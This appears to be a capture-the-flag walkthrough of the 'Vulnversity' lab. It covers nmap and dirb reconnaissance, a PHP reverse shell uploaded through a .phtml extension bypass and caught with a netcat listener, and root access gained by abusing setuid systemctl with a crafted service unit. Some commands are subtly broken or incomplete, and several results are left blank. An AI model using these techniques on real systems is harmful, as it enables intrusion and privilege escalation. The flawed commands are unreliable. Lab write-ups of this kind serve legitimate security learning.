---
layout: default
---

## Vulnversity  
Focuses on active recon, Web app attacks and privilege escalation 
### Reconnaissance
Gathering information about the machine using tools such as nmap. 
Always perform reconnaissance thoroughly before progressing. 

#### Nmap

    nmap -v -A -sV -sC -A -p- -Pn -oN nmap.out 10.10.228.44

-A : Aggressive Scan and provides OS and Version Detection 
-sV : Discovers the Services with their versions 
-sC: Scan with default nmap scripts 
-p-: Scan all 65535 ports
-Pn: Disable the host discovery and perform only scan on open ports. 
-oN: Save the output in a file 

*Result:*
- The target has below ports open
- Operating System: Ubuntu 
- Services: 
	 - HTTP - 3333 
	 - SSH - 
	 - 
 ### Scanning HTTP service 
 Using dirb scan the HTTP service to find the directories. 

    dirb http://10.10.228.44:3333/ /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 

*Result* 
                                                 
    GENERATED WORDS: 87568      
    ---- Scanning URL: http://10.10.228.44:3333/ ----
    ==> DIRECTORY: http://10.10.228.44:3333/images/                                                                      
    ==> DIRECTORY: http://10.10.228.44:3333/css/                                                                         
    ==> DIRECTORY: http://10.10.228.44:3333/js/                                                                          
    ==> DIRECTORY: http://10.10.228.44:3333/fonts/                                                                       
    ==> DIRECTORY: http://10.10.228.44:3333/internal/   

Navigate to these directories and found `/internal/` is hosting a upload page. 

### Get a reverse shell
- Using Burp, found the site is accepting the phtml extension in upload page.
- Using the [exploit](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php), configured the listening host and port and uploaded the php reverse shell code to the target. 
- Opened the netcat on the listening host and port.
  `nc -nlvp 4444` 
- Execute the uploaded file by navigating to /internal/uploads/ and the reverse shell connection is established. 

### Privilege Escalation 

 - Found the server has mis-configuration  with setuid bit on /bin/systemctl 
 `find / -perm /4000 -type f -exec -ld {} \; 2>/dev/null`
 - Created a new service by: 
 - 

    echo '[Service]
     ExecStart=/bin/sh -c "cp /root/root.txt > /tmp/flag.txt" 
     [Install]
     WantedBy=multi-user.target' > $eob
- Started the service: 

    /bin/systemctl link $eob
    /bin/systemctl enable --now $eob

- The file was written to desired file in /tmp and thus able to escalate the privileges. 


